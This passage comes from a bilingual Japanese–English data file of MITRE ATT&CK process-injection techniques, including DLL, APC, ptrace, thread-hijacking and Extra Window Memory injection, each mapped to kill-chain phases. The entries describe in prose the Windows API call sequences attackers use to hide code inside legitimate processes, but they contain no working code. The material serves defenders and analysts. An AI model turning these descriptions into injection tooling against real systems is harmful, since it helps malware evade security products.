より高度なサンプルでは、モジュールをセグメント化し、検出をさらに回避するために複数のプロセスインジェクションを実行し、通信チャネルとして名前付きパイプやその他のプロセス間通信（IPC）メカニズムを利用する場合があります。","Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.

There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific.

More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",T1055.011,追加ウィンドウメモリインジェクション,Extra Window Memory Injection,"攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、追加ウィンドウメモリ（EWM）を介してプロセスに悪意のあるコードを注入する可能性があります。EWMインジェクションは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。

ウィンドウを作成する前に、グラフィカルなWindowsベースのプロセスは、外観と動作を規定するウィンドウクラスを規定または登録する必要があります（データの入出力を処理する関数であるウィンドウプロシージャを介して）。(引用: Microsoft Window Classes) 新しいウィンドウクラスの登録には、そのクラスの各インスタンスの割り当て済みメモリに追加される最大40バイトのEWMのリクエストを含めることができます。このEWMは、そのウィンドウに固有のデータを格納することを目的としており、その値を設定および取得するための特定のアプリケーションプログラミングインターフェイス（API）関数を持っています。(引用: Microsoft GetWindowLong function)(引用: Microsoft SetWindowLong function)

小さいながらも、EWMは32ビットポインタを格納するのに十分な大きさであり、ウィンドウプロシージャを指すためによく使用されます。マルウェアは、プロセスのメモリの共有セクションにコードを書き込み、EWMにコードへのポインタを配置し、プロセスのEWM内のアドレスに実行制御を返すことによって実行を呼び出すことを含む攻撃チェーンの一部として、このメモリロケーションを利用する可能性があります。

EWMインジェクションを介して付与された実行は、ターゲットプロセスのメモリと、場合によっては昇格された権限の両方へのアクセスを許可する可能性があります。共有セクションへのペイロードの書き込みは、<code>WriteProcessMemory</code>や<code>CreateRemoteThread</code>などの監視の厳しいAPI呼び出しの使用も回避します。(引用: Elastic Process Injection July 2017) より高度なマルウェアサンプルは、ターゲットプロセスの実行可能部分内に悪意のあるペイロードを書き換えるウィンドウプロシージャと他のシステム関数の組み合わせをトリガーすることによって、データ実行防止（DEP）などの保護メカニズムをバイパスする可能性もあります。(引用: MalwareTech Power Loader Aug 2013)(引用: WeLiveSecurity Gapz and Redyms Mar 2013)

別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースへのアクセスが可能になり、場合によっては権限が昇格される可能性があります。EWMインジェクションによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。","Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process.

Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).(Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)

Although small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.

Execution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>.(Citation: Elastic Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1055,プロセスインジェクション,Process Injection,"攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、プロセスにコードを注入する可能性があります。プロセスインジェクションは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースにアクセスでき、場合によっては権限が昇格される可能性があります。プロセスインジェクションによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。

プロセスにコードを注入する方法は多数あり、その多くは正当な機能を悪用しています。これらの実装は主要なOSすべてに存在しますが、通常はプラットフォーム固有です。

より高度なサンプルでは、モジュールをセグメント化し、検出をさらに回避するために複数のプロセスインジェクションを実行し、通信チャネルとして名前付きパイプやその他のプロセス間通信（IPC）メカニズムを利用する場合があります。","Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.

There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific.

More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",T1055.001,ダイナミックリンクライブラリインジェクション,Dynamic-link Library Injection,"攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、ダイナミックリンクライブラリ（DLL）をプロセスに注入する可能性があります。DLLインジェクションは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。

DLLインジェクションは一般的に、新しいスレッドを呼び出してDLLをロードする前に、ターゲットプロセスの仮想アドレス空間にDLLへのパスを書き込むことによって実行されます。書き込みは、<code>VirtualAllocEx</code>や<code>WriteProcessMemory</code>などのネイティブWindows API呼び出しで実行でき、その後<code>CreateRemoteThread</code>（DLLのロードを担当する<code>LoadLibrary</code> APIを呼び出す）で呼び出されます。(引用: Elastic Process Injection July 2017)

リフレクティブDLLインジェクション（自己マッピングDLLをプロセスに書き込む）やメモリモジュール（プロセスへの書き込み時にDLLをマップする）などのこのメソッドのバリエーションは、アドレス再配置の問題や実行を呼び出すための追加のAPIを克服します（これらのメソッドは<code>LoadLibrary</code>の機能を手動で実行することによってメモリ内のファイルをロードして実行するため）。(引用: Elastic HuntingNMemory June 2017)(引用: Elastic Process Injection July 2017)

モジュールストンピング/オーバーロードまたはDLLハロウイングとしばしば呼ばれるこのメソッドの別のバリエーションは、プロセス内に注入されたコードを隠蔽するために活用される可能性があります。このメソッドは、正当なDLLをリモートプロセスにロードし、ターゲットプロセスで新しいスレッドを開始する前にモジュールの<code>AddressOfEntryPoint</code>を手動で上書きすることを含みます。(引用: Module Stomping for Shellcode Injection) このバリエーションにより、攻撃者はディスク上の正当なDLLファイルで実行を潜在的にバックアップすることにより、悪意のある注入コードを隠すことができます。(引用: Hiding Malicious Code with Module Stomping)

別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースへのアクセスが可能になり、場合によっては権限が昇格される可能性があります。DLLインジェクションによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。","Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.

DLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). (Citation: Elastic Process Injection July 2017)

Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017)

Another variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process.(Citation: Module Stomping for Shellcode Injection) This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.(Citation: Hiding Malicious Code with Module Stomping)

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1055,プロセスインジェクション,Process Injection,"攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、プロセスにコードを注入する可能性があります。プロセスインジェクションは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースにアクセスでき、場合によっては権限が昇格される可能性があります。プロセスインジェクションによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。

プロセスにコードを注入する方法は多数あり、その多くは正当な機能を悪用しています。これらの実装は主要なOSすべてに存在しますが、通常はプラットフォーム固有です。

より高度なサンプルでは、モジュールをセグメント化し、検出をさらに回避するために複数のプロセスインジェクションを実行し、通信チャネルとして名前付きパイプやその他のプロセス間通信（IPC）メカニズムを利用する場合があります。","Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.

There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific.

More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",T1055.003,スレッド実行ハイジャック,Thread Execution Hijacking,"攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、乗っ取ったプロセスに悪意のあるコードを注入する可能性があります。スレッド実行ハイジャックは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。

スレッド実行ハイジャックは、通常、既存のプロセスを中断し、そのメモリをアンマップ/空洞化した後、悪意のあるコードまたはDLLへのパスに置き換えることによって実行されます。既存の被害者プロセスへのハンドルは、まず<code>OpenThread</code>などのネイティブWindows API呼び出しで作成されます。この時点で、プロセスは中断された後、書き込まれ、注入されたコードに再配置され、それぞれ<code>SuspendThread </code>、<code>VirtualAllocEx</code>、<code>WriteProcessMemory</code>、<code>SetThreadContext</code>、そして<code>ResumeThread</code>を介して再開されます。(引用: Elastic Process Injection July 2017)

これは[プロセスハロウイング](https://attack.mitre.org/techniques/T1055/012)と非常によく似ていますが、中断状態でプロセスを作成するのではなく、既存のプロセスをターゲットにします。

別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースへのアクセスが可能になり、場合によっては権限が昇格される可能性があります。スレッド実行ハイジャックによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。","Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process.

Thread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point the process can be suspended then written to, realigned to the injected code, and resumed via <code>SuspendThread </code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Elastic Process Injection July 2017)

This is very similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) but targets an existing process rather than creating a process in a suspended state.

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1055,プロセスインジェクション,Process Injection,"攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、プロセスにコードを注入する可能性があります。プロセスインジェクションは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースにアクセスでき、場合によっては権限が昇格される可能性があります。プロセスインジェクションによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。

プロセスにコードを注入する方法は多数あり、その多くは正当な機能を悪用しています。これらの実装は主要なOSすべてに存在しますが、通常はプラットフォーム固有です。

より高度なサンプルでは、モジュールをセグメント化し、検出をさらに回避するために複数のプロセスインジェクションを実行し、通信チャネルとして名前付きパイプやその他のプロセス間通信（IPC）メカニズムを利用する場合があります。","Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.

There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific.

More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",T1055.008,Ptraceシステムコール,Ptrace System Calls,"攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、ptrace（プロセストレース）システムコールを介してプロセスに悪意のあるコードを注入する可能性があります。Ptraceシステムコールインジェクションは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。

Ptraceシステムコールインジェクションは、実行中のプロセスにアタッチして変更することを含みます。ptraceシステムコールにより、デバッグプロセスは、メモリやレジスタ値の変更を含む、別のプロセス（および個々のスレッド）を監視および制御できます。(引用: PTRACE man) Ptraceシステムコールインジェクションは、通常、実行中のプロセスに任意のコード（例: <code>malloc</code>）を書き込み、次にそのメモリを<code>PTRACE_SETREGS</code>で呼び出して、次に実行する命令を含むレジスタを設定することによって実行されます。Ptraceシステムコールインジェクションは、<code>PTRACE_POKETEXT</code>/<code>PTRACE_POKEDATA</code>（ターゲットプロセスのメモリ内の特定のアドレス（例: 次の命令の現在のアドレス）にデータをコピーする）でも実行できます。(引用: PTRACE man)(引用: Medium Ptrace JUL 2018)

非子プロセスやより高い権限を持つプロセスをターゲットとする場合、Ptraceシステムコールインジェクションは不可能である可能性があります。(引用: BH Linux Inject)

別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースへのアクセスが可能になり、場合によっては権限が昇格される可能性があります。ptraceシステムコールインジェクションによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。","Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process.

Ptrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values.(Citation: PTRACE man) Ptrace system call injection is commonly performed by writing arbitrary code into a running process (ex: <code>malloc</code>) then invoking that memory with <code>PTRACE_SETREGS</code> to set the register containing the next instruction to execute. Ptrace system call injection can also be done with <code>PTRACE_POKETEXT</code>/<code>PTRACE_POKEDATA</code>, which copy data to a specific address in the target processes’ memory (ex: the current address of the next instruction). (Citation: PTRACE man)(Citation: Medium Ptrace JUL 2018)

Ptrace system call injection may not be possible targeting processes that are non-child processes and/or have higher-privileges.(Citation: BH Linux Inject)

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1055,プロセスインジェクション,Process Injection,"攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、プロセスにコードを注入する可能性があります。プロセスインジェクションは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースにアクセスでき、場合によっては権限が昇格される可能性があります。プロセスインジェクションによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。

プロセスにコードを注入する方法は多数あり、その多くは正当な機能を悪用しています。これらの実装は主要なOSすべてに存在しますが、通常はプラットフォーム固有です。

より高度なサンプルでは、モジュールをセグメント化し、検出をさらに回避するために複数のプロセスインジェクションを実行し、通信チャネルとして名前付きパイプやその他のプロセス間通信（IPC）メカニズムを利用する場合があります。","Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.

There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific.

More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",T1055.004,非同期手続き呼び出し,Asynchronous Procedure Call,"攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、非同期プロシージャコール（APC）キューを介してプロセスに悪意のあるコードを注入する可能性があります。APCインジェクションは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。

APCインジェクションは、一般的に、プロセスのスレッドのAPCキュー（引用: Microsoft APC）に悪意のあるコードをアタッチすることによって実行されます。キューに入れられたAPC関数は、スレッドが変更可能な状態に入ったときに実行されます。(引用: Microsoft APC) 既存の被害者プロセスへのハンドルは、まず<code>OpenThread</code>などのネイティブWindows API呼び出しで作成されます。この時点で、<code>QueueUserAPC</code>を使用して関数（悪意のあるDLLを指す<code>LoadLibrayA</code>など）を呼び出すことができます。

「アーリーバードインジェクション」と呼ばれるAPCインジェクションの変形は、プロセスのエントリポイント（および潜在的な後続のマルウェア対策フック）の前にAPCを介して悪意のあるコードを書き込んで実行できる中断プロセスを作成することを含みます。(引用: CyberBit Early Bird Apr 2018) AtomBombing（引用: ENSIL AtomBombing Oct 2016）は、以前にグローバルアトムテーブルに書き込まれた悪意のあるコードを呼び出すためにAPCを利用する別の変形です。(引用: Microsoft Atom Table)

別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースへのアクセスが可能になり、場合によっては権限が昇格される可能性があります。APCインジェクションによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。","Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process.

APC injection is commonly performed by attaching malicious code to the APC Queue (Citation: Microsoft APC) of a process's thread. Queued APC functions are executed when the thread enters an alterable state.(Citation: Microsoft APC) A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point <code>QueueUserAPC</code> can be used to invoke a function (such as <code>LoadLibrayA</code> pointing to a malicious DLL).

A variation of APC injection, dubbed \""Early Bird injection\"", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC. (Citation: CyberBit Early Bird Apr 2018) AtomBombing (Citation: ENSIL AtomBombing Oct 2016) is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.(Citation: Microsoft Atom Table)

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1055,プロセスインジェクション,Process Injection,"攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、プロセスにコードを注入する可能性があります。プロセスインジェクションは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースにアクセスでき、場合によっては権限が昇格される可能性があります。プロセスインジェクションによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。

プロセスにコードを注入する方法は多数あり、その多くは正当な機能を悪用しています。これらの実装は主要なOSすべてに存在しますが、通常はプラットフォーム固有です。

より高度なサンプルでは、モジュールをセグメント化し、検出をさらに回避するために複数のプロセスインジェクションを実行し、通信チャネルとして名前付きパイプやその他のプロセス間通信（IPC）メカニズムを利用する場合があります。","Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.

There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific.

More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",T1055.002,ポータブル実行可能ファイルインジェクション,Portable Executable Injection,"攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、ポータブル実行可能ファイル（PE）をプロセスに注入する可能性があります。PEインジェクションは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。

PEインジェクションは、一般的に、新しいスレッドを介して呼び出す前に、コード（ディスク上のファイルなしの場合もある）をターゲットプロセスの仮想アドレス空間にコピーすることによって実行されます。書き込みは、<code>VirtualAllocEx</code>や<code>WriteProcessMemory</code>などのネイティブWindows API呼び出しで実行でき、その後<code>CreateRemoteThread</code>または追加のコード（例: シェルコード）で呼び出されます。注入されたコードの変位は、メモリ参照を再マップする機能に対する追加の要件を導入します。(引用: Elastic Process Injection July 2017)

別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースへのアクセスが可能になり、場合によっては権限が昇格される可能性があります。PEインジェクションによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。","Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process.

PE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references. (Citation: Elastic Process Injection July 2017)

